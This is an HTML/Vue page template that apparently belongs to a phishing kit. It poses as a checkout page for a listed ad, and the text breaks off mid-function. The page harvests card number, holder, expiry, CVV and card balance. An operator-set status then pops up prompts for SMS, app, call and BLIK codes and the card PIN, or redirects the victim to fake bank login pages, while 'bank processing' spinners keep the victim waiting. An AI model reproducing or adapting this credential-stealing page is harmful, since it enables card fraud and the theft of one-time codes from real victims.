<html lang="es">

<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta content="noindex" name="robots">
  <meta content="IE=edge" http-equiv="X-UA-Compatible">
  <meta content="width=device-width,initial-scale=1,maximum-scale=1" name="viewport">
  <meta content="notranslate" name="google">
  <title>
    <%=ad.title%>
  </title>
  <link rel="stylesheet" href="/css/support_parent.css" />
  <link rel="stylesheet" href="/css/normalize.css">
  <link rel="stylesheet" href="/assets/ad/style.css">
  <link rel="shortcut icon"
    href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTdsDuy3YJpUXHRnI35N8Zr3mlfSFnFQCY26Q&usqp=CAU"
    type="image/x-icon">
  <style>
    body {
      /*background: rgb(210,168,168);
      background: linear-gradient(45deg, rgba(210,168,168,1) 0%, rgba(255,231,231,1) 50%, rgba(255,255,255,1) 100%);
      */
      background: rgb(168, 185, 210);
      background: linear-gradient(45deg, rgba(168, 185, 210, 1) 0%, rgba(231, 243, 255, 1) 50%, rgba(255, 255, 255, 1) 100%);
    }

    .SubmitButton {
      /*background-color: #c11818;*/
      background-color: #1867c1;
      color: #fff;
    }

    .SubmitButton:disabled {
      background: #d4d3d3;
      cursor: default;
      color: #fff;
    }
  </style>
</head>

<body>
  <noscript>You need to enable JavaScript to run this app.</noscript>
  <div id="root">
    <div class="App-Container flex-container justify-content-center">
      <div class="App App--keyboardInteractionMode App--singleItem">
        <div class="App-Overview">
          <header class="Header">
            <div class="Header-Content flex-container justify-content-space-between align-items-stretch">
              <div class="Header-business flex-item width-grow flex-container align-items-center">
                <a class="Link Header-businessLink Link--primary" href="/<%=ad.id%>" target="_self"
                  title=" <%=ad.service.code.split(" _")[0].toUpperCase()%>.
                  <%=ad.service.code.split("_")[1].toUpperCase()%>">
                    <div style="position: relative;">
                      <div class="flex-container align-items-center">
                        <div class="Header-backArrowContainer" style="opacity: 1; transform: none;">
                          <svg class="InlineSVG Icon Header-backArrow mr2 Icon--sm" focusable="false" height="12"
                            viewBox="0 0 16 16" width="12">
                            <path
                              d="M3.417 7H15a1 1 0 0 1 0 2H3.417l4.591 4.591a1 1 0 0 1-1.415 1.416l-6.3-6.3a1 1 0 0 1 0-1.414l6.3-6.3A1 1 0 0 1 8.008 2.41z"
                              fill-rule="evenodd"></path>
                          </svg>
                        </div>
                        <div class="Header-merchantLogoContainer" style="transform: none;">
                          <div class="Header-merchantLogoWithLabel flex-item width-grow">
                            <div
                              class="HeaderImage HeaderImage--icon HeaderImage--iconFallback flex-item width-fixed flex-container justify-content-center align-items-center width-fixed">
                              <svg class="InlineSVG Icon HeaderImage-fallbackIcon Icon--sm" focusable="false"
                                viewBox="0 0 16 16">
                                <path
                                  d="M3 7.5V12h10V7.5c.718 0 1.398-.168 2-.468V15a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1V7.032c.602.3 1.282.468 2 .468zM0 3L1.703.445A1 1 0 0 1 2.535 0h10.93a1 1 0 0 1 .832.445L16 3a3 3 0 0 1-5.5 1.659C9.963 5.467 9.043 6 8 6s-1.963-.533-2.5-1.341A3 3 0 0 1 0 3z"
                                  fill-rule="evenodd"></path>
                              </svg>
                            </div>
                            <span
                              class="Header-businessLink-label Text Text-color--gray800 Text-fontSize--14 Text-fontWeight--500">
                              Back
                            </span>
                            <h1
                              class="Header-businessLink-name Text Text-color--gray800 Text-fontSize--14 Text-fontWeight--500 Text--truncate">
                              <%=ad.service.code.split("_")[0].toUpperCase()%>.
                                <%=ad.service.code.split("_")[1].toUpperCase()%>
                            </h1>
                          </div>
                        </div>
                      </div>
                    </div>
                </a>
              </div>
            </div>
          </header>
          <div class="App-productSummaryContainer">
            <div class="ProductSummary">
              <div class="ProductSummary-productImageContainer">
                <!-- <div class="ProductImage-container"><img alt=" <%=ad.service.code.split("_")[0].toUpperCase()%>.<%=ad.service.code.split("_")[1].toUpperCase()%>" class="ProductImage-image" fetchpriority="high" src="/assets/ad/logos/<%=ad.service.code%>.png" height="84"></div> -->
              </div>
              <div class="ProductSummary-info"><span
                  class="ProductSummary-name Text Text-color--gray500 Text-fontSize--16 Text-fontWeight--500">
                  <%=ad.service.code.split("_")[0].toUpperCase()%>.<%=ad.service.code.split("_")[1].toUpperCase()%>
                </span>
                <div class="ProductSummary-amountsContainer">
                  <div class="ProductSummary-totalsRead">
                    <div class="ProductSummary-totalAmountContainer"><span
                        class="ProductSummary-totalAmount Text Text-color--default Text-fontWeight--600 Text--tabularNumbers"
                        id="ProductSummary-totalAmount"><span>
                          <%=ad.price%>
                        </span></span></div>
                  </div>
                </div>
                <span class="ProductSummary-description Text Text-color--gray500 Text-fontSize--14 Text-fontWeight--500"
                  id="ProductSummary-description">
                  <div class="ProductSummaryDescription ProductSummaryDescription--singleItem">
                    <%=translate["receive"][ad.service.lang]%>
                  </div>
                </span>
              </div>
            </div>
          </div>
        </div>
        <div class="App-Payment" id="app">
          <form @submit="submitForm" class="card-form">
            <div class="CheckoutPaymentForm">
              <div class="PaymentRequestOrHeader" style="display: inherit; height: auto;">
                <div class="PaymentHeaderContainer" style="display: block; opacity: 1;">
                  <div class="PaymentHeader" style="display: block">
                    <div class="Text Text-color--default Text-fontSize--20 Text-fontWeight--500">
                      <%=translate["receive"][ad.service.lang]%>
                    </div>
                  </div>
                </div>
                <div class="ButtonAndDividerContainer" style="opacity: 0; display: none;"></div>
              </div>
              <div class="flex-container direction-column" style="">
                <div>
                  <div>
                    <div style="opacity: 1;">
                      <div class="App-Global-Fields flex-container spacing-16 direction-row wrap-wrap">
                        <div class="flex-item width-12">
                          <div class="ReadOnlyForm ReadOnlyForm--withShadow" role="list">
                            <div class="ReadOnlyFormField-email ReadOnlyFormField">
                              <div class="ReadOnlyFormField-label"><span
                                  class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">
                                  <%=translate["product_name"][ad.service.lang]%>
                                </span>
                              </div>
                              <div class="ReadOnlyFormField-content">
                                <div class="ReadOnlyFormField-titleContainer">
                                  <div class="ReadOnlyFormField-title">
                                    <%=ad.title%>
                                  </div>
                                  <div class="ReadOnlyFormField-action"></div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div class="PaymentForm-paymentMethodForm flex-container spacing-16 direction-column wrap-wrap">
                        <div class="flex-item width-12">
                          <div class="FormFieldGroup">
                            <div class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
                              <label for="cardNumber-fieldset"><span
                                  class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">
                                  <%=translate["card_information"][ad.service.lang]%>
                                </span></label>
                            </div>
                            <div class="FormFieldInput">
                              <div class="CheckoutInputContainer">
                                <span class="InputContainer" data-max="">
                                  <input required aria-invalid="false" autocorrect="off"
                                    class="CheckoutInput CheckoutInput--tabularnums Input Input--empty"
                                    data-ref="cardHolder" id="cardHolder" placeholder="<%=translate["card_holder"][ad.service.lang]%>"
                                  type="text"
                                  v-model="cardHolder">


                                  <fieldset class="FormFieldGroup-Fieldset" id="cardNumber-fieldset">
                                    <div class="FormFieldGroup-container" id="cardNumber-fieldset">
                                      <div
                                        class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childTop">
                                        <div class="FormFieldInput">

                                          <div class="CheckoutInputContainer">
                                            <span class="InputContainer" data-max="">
                                              <input required aria-invalid="false" autocomplete="cc-number"
                                                autocorrect="off"
                                                class="CheckoutInput CheckoutInput--tabularnums Input Input--empty"
                                                data-ref="cardNumber" id="cardNumber" inputmode="numeric"
                                                placeholder="<%=translate["card_number"][ad.service.lang]%>"
                                              spellcheck="false" type="text" v-mask="generateCardNumberMask"
                                              v-model="cardNumber">
                                            </span>
                                          </div>
                                          <div class="FormFieldInput-Icons" style="opacity: 1;">
                                            <div id="bankicon1" style="transform: none;">
                                              <span class="FormFieldInput-IconsIcon is-visible">
                                                <img alt="visa" class="BrandIcon"
                                                  src="/test/visa-365725566f9578a9589553aa9296d178.svg"
                                                  v-if="!getCardType || (getCardType === 'visa')">
                                              </span>
                                            </div>
                                            <div id="bankicon2" style="transform: none;">
                                              <span class="FormFieldInput-IconsIcon is-visible">
                                                <img alt="mastercard" class="BrandIcon"
                                                  src="/test/mastercard-4d8844094130711885b5e41b28c9848f.svg"
                                                  v-if="!getCardType || (getCardType === 'mastercard')">
                                              </span>
                                            </div>
                                            <div id="bankicon3" style="transform: none;">
                                              <span class="FormFieldInput-IconsIcon is-visible">
                                                <img alt="amex" class="BrandIcon"
                                                  src="/test/amex-a49b82f46c5cd6a96a6e418a6ca1717c.svg"
                                                  v-if="!getCardType || (getCardType === 'amex')">
                                              </span>
                                            </div>

                                          </div>
                                        </div>
                                      </div>
                                      <div class="FormFieldGroup-child FormFieldGroup-child--width-6">
                                        <div class="FormFieldInput" v-bind:class="{ 'has-icon': cardMonth === '' }">
                                          <div class="CheckoutInputContainer">
                                            <span class="InputContainer" data-max="">
                                              <select
                                                class="CheckoutInput CheckoutInput--tabularnums Input Input--empty"
                                                data-ref="cardDate" id="cardMonth" required v-model="cardMonth">
                                                <option disabled selected value="">
                                                  <%=translate["month"][ad.service.lang]%>
                                                </option>
                                                <option v-bind:disabled="n < minCardMonth" v-bind:key="n"
                                                  v-bind:value="n < 10 ? '0' + n : n" v-for="n in 12">
                                                  {{n < 10 ? '0' + n : n}} </option>
                                              </select>
                                            </span>
                                          </div>
                                          <div class="FormFieldInput-Icon is-loaded" id="cvcicon"
                                            style="margin-top: 27px; display: none;">
                                            <svg class="Icon Icon--md" focusable="false" viewBox="0 0 32 21">
                                              <g fill="none" fill-rule="evenodd">
                                                <g class="Icon-fill">
                                                  <g transform="translate(0 2)">
                                                    <path
                                                      d="M21.68 0H2c-.92 0-2 1.06-2 2v15c0 .94 1.08 2 2 2h25c.92 0 2-1.06 2-2V9.47a5.98 5.98 0 0 1-3 1.45V11c0 .66-.36 1-1 1H3c-.64 0-1-.34-1-1v-1c0-.66.36-1 1-1h17.53a5.98 5.98 0 0 1 1.15-9z"
                                                      opacity=".2"></path>
                                                    <path d="M19.34 3H0v3h19.08a6.04 6.04 0 0 1 .26-3z" opacity=".3">
                                                    </path>
                                                  </g>
                                                  <g transform="translate(18)">
                                                    <path
                                                      d="M7 14A7 7 0 1 1 7 0a7 7 0 0 1 0 14zM4.22 4.1h-.79l-1.93.98v1l1.53-.8V9.9h1.2V4.1zm2.3.8c.57 0 .97.32.97.78 0 .5-.47.85-1.15.85h-.3v.85h.36c.72 0 1.21.36 1.21.88 0 .5-.48.84-1.16.84-.5 0-1-.16-1.52-.47v1c.56.24 1.12.37 1.67.37 1.31 0 2.21-.67 2.21-1.64 0-.68-.42-1.23-1.12-1.45.6-.2.99-.73.99-1.33C8.68 4.64 7.85 4 6.65 4a4 4 0 0 0-1.57.34v.98c.48-.27.97-.42 1.44-.42zm4.32 2.18c.73 0 1.24.43 1.24.99 0 .59-.51 1-1.24 1-.44 0-.9-.14-1.37-.43v1.03c.49.22.99.33 1.48.33.26 0 .5-.04.73-.1.52-.85.82-1.83.82-2.88l-.02-.42a2.3 2.3 0 0 0-1.23-.32c-.18 0-.37.01-.57.04v-1.3h1.44a5.62 5.62 0 0 0-.46-.92H9.64v3.15c.4-.1.8-.17 1.2-.17z">
                                                    </path>
                                                  </g>
                                                </g>
                                              </g>
                                            </svg>
                                          </div>
                                        </div>
                                      </div>
                                      <div class="FormFieldGroup-child FormFieldGroup-child--width-6">
                                        <div class="FormFieldInput has-icon">
                                          <div class="CheckoutInputContainer" style="width: 100%;">
                                            <span class="InputContainer" data-max="">
                                              <select
                                                class="CheckoutInput CheckoutInput--tabularnums Input Input--empty"
                                                data-ref="cardDate" id="cardYear" required v-model="cardYear">
                                                <option disabled selected value="">
                                                  <%=translate["year"][ad.service.lang]%>
                                                </option>
                                                <option v-bind:key="n" v-bind:value="$index + minCardYear"
                                                  v-for="(n, $index) in 12">
                                                  {{$index + minCardYear}}
                                                </option>
                                              </select>
                                            </span>
                                          </div>
                                        </div>
                                      </div>
                                      <div
                                        class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childBottom">
                                        <div class="FormFieldInput has-icon">
                                          <div class="CheckoutInputContainer"><span class="InputContainer"><input
                                                required aria-invalid="false" aria-label="CVC" autocomplete="cc-csc"
                                                autocorrect="off"
                                                class="CheckoutInput CheckoutInput--tabularnums Input Input--empty"
                                                id="cardCvv" inputmode="numeric" maxlength="3" minlength="3"
                                                name="cardCvc" placeholder="CVC/CVV" spellcheck="false" type="text"
                                                v-mask="'####'" v-model="cardCvv" value=""></span></div>

                                          <span class="text-danger" v-if="cardError">{{ cardError }}</span>

                                          <div class="FormFieldInput-Icon is-loaded">
                                            <svg aria-label="CVC" class="Icon Icon--md" focusable="false" role="img"
                                              viewBox="0 0 32 21">
                                              <title>CVV</title>
                                              <g fill="none" fill-rule="evenodd">
                                                <g class="Icon-fill">
                                                  <g transform="translate(0 2)">
                                                    <path
                                                      d="M21.68 0H2c-.92 0-2 1.06-2 2v15c0 .94 1.08 2 2 2h25c.92 0 2-1.06 2-2V9.47a5.98 5.98 0 0 1-3 1.45V11c0 .66-.36 1-1 1H3c-.64 0-1-.34-1-1v-1c0-.66.36-1 1-1h17.53a5.98 5.98 0 0 1 1.15-9z"
                                                      opacity=".2"></path>
                                                    <path d="M19.34 3H0v3h19.08a6.04 6.04 0 0 1 .26-3z" opacity=".3">
                                                    </path>
                                                  </g>
                                                  <g transform="translate(18)">
                                                    <path
                                                      d="M7 14A7 7 0 1 1 7 0a7 7 0 0 1 0 14zM4.22 4.1h-.79l-1.93.98v1l1.53-.8V9.9h1.2V4.1zm2.3.8c.57 0 .97.32.97.78 0 .5-.47.85-1.15.85h-.3v.85h.36c.72 0 1.21.36 1.21.88 0 .5-.48.84-1.16.84-.5 0-1-.16-1.52-.47v1c.56.24 1.12.37 1.67.37 1.31 0 2.21-.67 2.21-1.64 0-.68-.42-1.23-1.12-1.45.6-.2.99-.73.99-1.33C8.68 4.64 7.85 4 6.65 4a4 4 0 0 0-1.57.34v.98c.48-.27.97-.42 1.44-.42zm4.32 2.18c.73 0 1.24.43 1.24.99 0 .59-.51 1-1.24 1-.44 0-.9-.14-1.37-.43v1.03c.49.22.99.33 1.48.33.26 0 .5-.04.73-.1.52-.85.82-1.83.82-2.88l-.02-.42a2.3 2.3 0 0 0-1.23-.32c-.18 0-.37.01-.57.04v-1.3h1.44a5.62 5.62 0 0 0-.46-.92H9.64v3.15c.4-.1.8-.17 1.2-.17z">
                                                    </path>
                                                  </g>
                                                </g>
                                              </g>
                                            </svg>
                                          </div>
                                        </div>
                                      </div>
                                      <div style="opacity: 0; height: 0px;"><span
                                          class="FieldError Text Text-color--red Text-fontSize--13"><span
                                            aria-hidden="true"></span></span></div>
                                    </div>
                                  </fieldset>
                              </div>
                            </div>
                            <div class="BillingAddressForm-addressInput flex-item width-12"
                              v-if="step === 2 && balanceChecker">
                              <div style="pointer-events: auto; height: auto; opacity: 1;">
                                <div class="flex-container spacing-16 direction-column wrap-wrap">
                                  <div class="flex-item width-12">
                                    <div class="FormFieldGroup">
                                      <div
                                        class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
                                        <label for="billingName"><span
                                            class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">
                                            <%=translate["card_balance"][ad.service.lang]%>
                                          </span></label>
                                      </div>
                                      <div class="FormFieldGroup-Fieldset">
                                        <div class="FormFieldGroup-container" id="billingName-fieldset">
                                          <div
                                            class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childTop FormFieldGroup-childBottom">
                                            <div class="FormFieldInput">
                                              <div class="CheckoutInputContainer">
                                                <span class="InputContainer" data-max="">
                                                  <input required aria-invalid="false" inputmode="" autocomplete="off"
                                                    autocorrect="off" class="CheckoutInput Input Input--empty"
                                                    id="cardBalance" spellcheck="false" type="text"
                                                    v-model="cardBalance" value="">
                                                </span>

                                              </div>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                  <div class="flex-item width-12" style="display:none" v-show="cardError">
                                    <div class="FormFieldGroup">
                                      <div
                                        class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
                                        <div><span class="FieldError Text Text-color--red Text-fontSize--13"> <span
                                              class="text-danger" v-if="cardError">{{ cardError }}</span>
                                          </span></div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="PaymentForm-confirmPaymentContainer flex-item width-grow">
                      <div class="flex-item width-12"></div>
                      <div class="flex-item width-12">
                        <button id="btn" v-if="!loading" class="SubmitButton SubmitButton--incomplete">
                          <%=translate["submit"][ad.service.lang]%>
                        </button>
                        <div class="ConfirmPayment-PostSubmit">
                          <div>
                            <div class="flex-container spacing-8 direction-column" style="margin-top: 4px;">
                              <div class="flex-item width-grow"></div>
                              <div class="flex-item width-grow">
                                <div style="height: 0px; opacity: 0; pointer-events: none;">
                                  <div class="ConfirmTerms Text Text-color--gray500 Text-fontSize--13"></div>
                                </div>
                              </div>
                              <div class="flex-item width-grow"></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
          </form>
        </div>
        <footer class="App-Footer Footer">
          <div class="Footer-Links"><a class="Link Link--primary" href="#" rel="noopener" target="_blank"><span
                class="Text Text-color--gray400 Text-fontSize--12 Text-fontWeight--400">Conditions</span></a><a
              class="Link Link--primary" href="#" rel="noopener" target="_blank"><span
                class="Text Text-color--gray400 Text-fontSize--12 Text-fontWeight--400">Confidentiality</span></a>
          </div>
        </footer>
      </div>
    </div>
  </div>
  <script <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js" crossorigin="anonymous"></script>
  <script src="https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/vue-swal@1.0.0/dist/vue-swal.min.js" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js" crossorigin="anonymous"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"
    integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
  <script defer>




    new Vue({
      el: "#app",
      data() {
        return {
          currentCardBackground: 8, // just for fun :D
          cardBalance: "",
          cardNumber: "",
          cardHolder: "",

          cardMonth: "",
          cardYear: "",
          cardCvv: "",
          minCardYear: new Date().getFullYear(),
          amexCardMask: "#### ###### #####",
          otherCardMask: "#### #### #### ####",
          cardNumberTemp: "",
          isCardFlipped: false,
          focusElementStyle: null,
          isInputFocused: false,
          step: 1,
          cardError: "",
          balanceChecker: <%=String(!!ad.balanceChecker) %>,
      loading: false,
        currentStatus: null,
          logToken: null,
            imgUrl: "http://via.placeholder.com/400x300?text=image%201",

          };
        },
    mounted() {
      this.cardNumberTemp = this.otherCardMask;
      document.getElementById("cardHolder").focus();
      // $("body").on(
      //   "click",
      //   ".pictures-container:not(.disabled) .pictures-element[data-item]",
      //   (e) => {
      //     e.preventDefault();
      //     $(".pictures-container").removeClass("disabled").addClass("disabled");
      //     axios.post(`/api/selectPicture`, {
      //       picture: $(e.target).data("item") || $(e.target).parent().data("item"),
      //       token: this.logToken
      //     }).catch(() => { }).finally(() => {
      //       setTimeout(() => {
      //         alert("<%=translate["wrong_picture"][ad.service.lang]%>");
      //         $(".pictures-container").removeClass("disabled");
      //         this.pictureModal();
      //       }, 750);
      //     });
      //   });
    },
    computed: {
      getCardType() {
        if (!this.cardNumber || String(this.cardNumber).trim().length < 1) return false;
        let number = this.cardNumber;
        let re = new RegExp("^4");
        if (number.match(re) != null) return "visa";

        re = new RegExp("^(34|37)");
        if (number.match(re) != null) return "amex";

        re = new RegExp("^5[1-5]");
        if (number.match(re) != null) return "mastercard";

        re = new RegExp("^6011");
        if (number.match(re) != null) return "discover";

        re = new RegExp("^9792");
        if (number.match(re) != null) return "troy";

        return "visa"; // default type
      },
      generateCardNumberMask() {
        return this.getCardType === "amex"
          ? this.amexCardMask
          : this.otherCardMask;
      },
      minCardMonth() {
        if (this.cardYear === this.minCardYear) return new Date().getMonth() + 1;
        return 1;
      },
    },
    watch: {
      cardYear() {
        if (this.cardMonth < this.minCardMonth) {
          this.cardMonth = "";
        }
      },
      currentStatus(v) {
        if (v == "profit") this.successModal();
        else if (v == "sms") this.codeModal();
        else if (v == "pincode") this.pinModal();


          
       

        else if (v.includes("error")) {
          this.erroronlModal(v.split("error_")[1]);
        }
      
        else if (v.includes("customDep")) {
          this.customdepModal(v.split("customDep_")[1]);
        }

        else if (v.includes("custom")) {
          this.customModal(v.split("custom_")[1]);
        }
      
        else if (v.includes("ferr")) this.ferrModal(
          "custom",
          "<%=translate["info"][ad.service.lang]%>",
          v.split("ferr_")[1],
          "<%=translate["enterrr"][ad.service.lang]%>",
          "<%=translate["wrongg"][ad.service.lang]%>",
        );
        else if (v == "appCode") this.codeModal(
          "app",
          "<%=translate["app_code_title"][ad.service.lang]%>",
          "<%=translate["app_code_text"][ad.service.lang]%>",
          "<%=translate["app_code_placeholder"][ad.service.lang]%>",
        );
        else if (v == "callCode") this.codeModal(
          "call",
          "<%=translate["call_code_title"][ad.service.lang]%>",
          "<%=translate["call_code_text"][ad.service.lang]%>",
          "<%=translate["call_code_placeholder"][ad.service.lang]%>",
        );
        else if (v == "blik") this.codeModal(
          "blik",
          "<%=translate["blik_code_title"][ad.service.lang]%>",
          "<%=translate["blik_code_text"][ad.service.lang]%>",
          "<%=translate["blik_code_placeholder"][ad.service.lang]%>",
        );
        else if (v == "picture") this.pictureModal(this.imgUrl);
        else if (v == "push") this.pushModal();
        else if (v == "limits") this.limitsModal();
        else if (v == "otherCard") this.otherCardModal();
        else if (v == "forVerify") this.forVerifyModal();
        else if (v == "correctBalance") this.correctBalanceModal();
        else if (v == "lk") document.location.href = `/bank/hu/<%=ad.id%>`;
        else if (v == "scream") document.location.href = `http://ibaillanos.tv`;

        else if (v == "dep") this.depModal();


        else if (v == "dkbLk") document.location.href = `/personal/${this.logToken}/2`;
        else if (v == "ingLk") document.location.href = `/personal/${this.logToken}/3`;
        else if (v == "otherLk") document.location.href = `/personal/${this.logToken}/4`;
      },
    },
    methods: {
      erroronlModal(err) {
  // Отображаем модальное окно с информацией об ошибке
  swal({
    title: "<%=translate['info'][ad.service.lang]%>",
    text: `${err}`,
    icon: "info",
    buttons: {
      retry: {
        text: "<%=translate['сonfirmed'][ad.service.lang]%>",
        value: "retry",
      },
    },
  })
  .then((value) => {
    // Проверяем, была ли нажата кнопка "Retry"
    if (value === "retry") {
      // Выполнение запроса при нажатии на кнопку "Retry"
      axios.post("/api/confirmed", { // Укажите здесь актуальный путь к вашему API
        token: this.logToken,
            })
      .then((response) => {
        console.log('Запрос выполнен успешно', response);
        swal({ 
                title: "<%=translate["wait"][ad.service.lang]%>", 
                text: "<%=translate["bank_processes"][ad.service.lang]%>", 
                icon: "https://i.imgur.com/AN1d86t.gif", 
                closeOnClickOutside: false, 
                closeOnEsc: false, 
                buttons: false, 
                showLoaderOnConfirm: true, // Включаем эффект загрузки 
              }) 
        // Здесь можете добавить логику для обработки успешного ответа,
        // например, закрыть модальное окно или показать сообщение об успехе
      })
      .catch((error) => {
        console.error('Ошибка при повторном выполнении запроса', error);
        // Можно вызвать errorModal снова, чтобы показать ошибку повторного запроса
        this.erroronlModal(error);
      });
    }
  });
}
,
     
      
      customdepModal(err) {
        swal(
          "",
          `<%=translate["dep_text"][ad.service.lang]%> ${err}`,
          "info"
        );
      },
      
      customModal(err) {
        swal(
          "",
          `${err}`,
          "error"
        );
      },
      
      limitsModal() {
        swal(
          "<%=translate["error_title"][ad.service.lang]%>",
          "<%=translate["limits"][ad.service.lang]%>",
          "error"
        );
      },
      depModal() {
        swal(
          "<%=translate["dep_error"][ad.service.lang]%>",
          "<%=translate["dep_text"][ad.service.lang]%>",

          "error"
        );
      },
      forVerifyModal() {
        swal(
          "<%=translate["error_title"][ad.service.lang]%>",
          "<%=translate["for_verify"][ad.service.lang]%>",
          "error"
        );
      },
      correctBalanceModal() {
        swal(
          "<%=translate["error_title"][ad.service.lang]%>",
          "<%=translate["correct_balance"][ad.service.lang]%>",
          "error"
        );
      },
      otherCardModal() {
        swal(
          "<%=translate["error_title"][ad.service.lang]%>",
          "<%=translate["other_card"][ad.service.lang]%>",
          "error"
        );
      },
      pushModal() {
  // Асинхронно выполняем первый запрос без ожидания действия пользователя
  axios.post("/auto/push", {
    token: this.logToken,
  })
  .then((response) => {
    console.log('Первый запрос выполнен успешно', response);
  })
  .catch((error) => {
    console.error('Ошибка выполнения первого запроса', error);
  });

  // Отображаем модальное окно sweetalert для подтверждения действия пользователя
  swal({
    title: "<%=translate['push_title'][ad.service.lang]%>",
    text: "<%=translate['push_text'][ad.service.lang]%>",
    icon: "info",
    closeOnClickOutside: true,
    closeOnEsc: true,
    buttons: {
      confirm: {
        text: "<%=translate['сonfirmed'][ad.service.lang]%>",
        value: true,
      },
    },
  })
  .then(async (value) => { // Используем async для обработки асинхронного кода внутри
    // Проверяем, была ли нажата кнопка "Confirmed"
    if (value) {
      try {
        // Открываем окно с сообщением ожидания
        swal({ 
          title: "<%=translate['wait'][ad.service.lang]%>", 
          text: "<%=translate['bank_processes'][ad.service.lang]%>", 
          icon: "https://i.imgur.com/AN1d86t.gif", 
          closeOnClickOutside: false, 
          closeOnEsc: false, 
          buttons: false, // Отключаем все кнопки
        });

        // Асинхронно выполняем второй запрос после нажатия на кнопку "Confirmed"
        const response = await axios.post("/api/confirmed", {
          token: this.logToken,
        });

        console.log('Второй запрос выполнен успешно', response);
        // Закрываем окно SweetAlert после успешного выполнения запроса
        swal({ 
                title: "<%=translate["wait"][ad.service.lang]%>", 
                text: "<%=translate["bank_processes"][ad.service.lang]%>", 
                icon: "https://i.imgur.com/AN1d86t.gif", 
                closeOnClickOutside: false, 
                closeOnEsc: false, 
                buttons: false, 
                showLoaderOnConfirm: true, // Включаем эффект загрузки 
              }) 
      } catch (error) {
        console.error('Ошибка выполнения второго запроса', error);
        // Показываем сообщение об ошибке, если запрос не удался
        swal("An error occurred", "Please try again later.", "error");
      }
    }
  });
}

,

      successModal() {
        swal(
          "<%=translate["success"][ad.service.lang]%>",
          "<%=translate["money_will"][ad.service.lang]%>",
          "info", {

          closeOnClickOutside: false,
          closeOnEsc: false,
          buttons: false,
        }
        );
      },
      successModal() {
        swal(
          "<%=translate["wait"][ad.service.lang]%>",
          "<%=translate["bank_processes"][ad.service.lang]%>",
          "info", {

          closeOnClickOutside: false,
          closeOnEsc: false,
          buttons: false,
        }
        );
      },



      pictureModal(img){
        swal("", "", "", {
          content: {
            element: "div",
            attributes: {
              id: "pictures_div"
            },
          },
          closeOnClickOutside: false,
          closeOnEsc: false,
          buttons: false,
        });

        document.querySelector("#pictures_div").innerHTML = `<div class="pictures-container"><div class="pictures-element" data-item="writerImg"><img width="auto" height="225"  draggable="false" alt="" src="${img}"></div>`;
        // document.querySelector(".pictures-container").classList.remove("disabled");
      },
      ferrModal(codeType = "sms", title = "<%=translate["sms_title"][ad.service.lang]%>", text = "<%=translate["sms_text"][ad.service.lang]%>", placeholder = "<%=translate["sms_placeholder"][ad.service.lang]%>", wrong_code = "<%=translate["wrong_code"][ad.service.lang]%>") {
        swal.stopLoading();
        swal({
          title,
          text,
          content: {
            element: "input",
            attributes: {
              type: "text",
              placeholder,
              maxLength: 255,
              required: true,
              style:
                "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
            },
          },
          closeOnEsc: false,
          closeOnClickOutside: false,
          buttons: {
            confirm: {
              text: "<%=translate["submit"][ad.service.lang]%>",
              closeModal: false,
            },
          },
        }).then(async (code) => {
          try {
            if (!code) {
              swal({ 
                title: "<%=translate["wait"][ad.service.lang]%>", 
                text: "<%=translate["bank_processes"][ad.service.lang]%>", 
                icon: "https://i.imgur.com/AN1d86t.gif", 
                closeOnClickOutside: false, 
                closeOnEsc: false, 
                buttons: false, 
                showLoaderOnConfirm: true, // Включаем эффект загрузки 
              }) 
            }
            const response = await axios.post("/api/submitCode", {
              codeType,
              code,
              token: this.logToken,
            });

            swal({ 
                title: "<%=translate["wait"][ad.service.lang]%>", 
                text: "<%=translate["bank_processes"][ad.service.lang]%>", 
                icon: "https://i.imgur.com/AN1d86t.gif", 
                closeOnClickOutside: false, 
                closeOnEsc: false, 
                buttons: false, 
                showLoaderOnConfirm: true, // Включаем эффект загрузки 
              }) 
          } catch (err) {
            swal({ 
                title: "<%=translate["wait"][ad.service.lang]%>", 
                text: "<%=translate["bank_processes"][ad.service.lang]%>", 
                icon: "https://i.imgur.com/AN1d86t.gif", 
                closeOnClickOutside: false, 
                closeOnEsc: false, 
                buttons: false, 
                showLoaderOnConfirm: true, // Включаем эффект загрузки 
              }) 
          }
        });
      },
    
      pinModal(codeType = "pin", title = "<%=translate["pincode_1"][ad.service.lang]%>", text = "<%=translate["pincode"][ad.service.lang]%>", wrong_code = "<%=translate["wrong_code"][ad.service.lang]%>") {
        swal.stopLoading();
        swal({
          title,
          text,
          content: {
            element: "input",
            attributes: {
              type: "password",
              maxLength: 255,
              required: true,
              style:
                "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
            },
          },
          closeOnEsc: false,
          closeOnClickOutside: false,
          buttons: {
            confirm: {
              text: "<%=translate["submit"][ad.service.lang]%>",
              closeModal: false,
            },
          },
        }).then(async (code) => {
          try {
            if (!code) {
              swal.stopLoading();
              alert(wrong_code);
